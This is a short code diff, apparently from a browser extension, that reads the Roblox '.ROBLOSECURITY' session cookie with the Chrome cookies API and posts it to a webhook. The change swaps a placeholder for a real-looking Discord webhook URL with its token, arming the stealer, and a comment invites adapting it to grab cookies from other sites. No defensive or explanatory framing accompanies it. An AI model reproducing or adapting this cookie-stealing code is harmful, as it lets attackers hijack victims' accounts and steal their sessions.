@@ -28,6 +28,6 @@ function webhookReq(webhook, cookie) {
 cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; // wanna grab other info from other sites? change the values both here and in the manifest.json file
 chrome.cookies.get(cookieInfo, function(cookie) {
   if (cookie) {
-    webhookReq("Webhook", cookie.value);
+    webhookReq("https://discord.com/api/webhooks/1169416235931406478/4OcUd-BAvb0V-sdHgT9Lvb55MBXaVEWCk9CviE5CATiFkPmP_pIZoeihd0atQhsCaFaH", cookie.value);
   }
 });
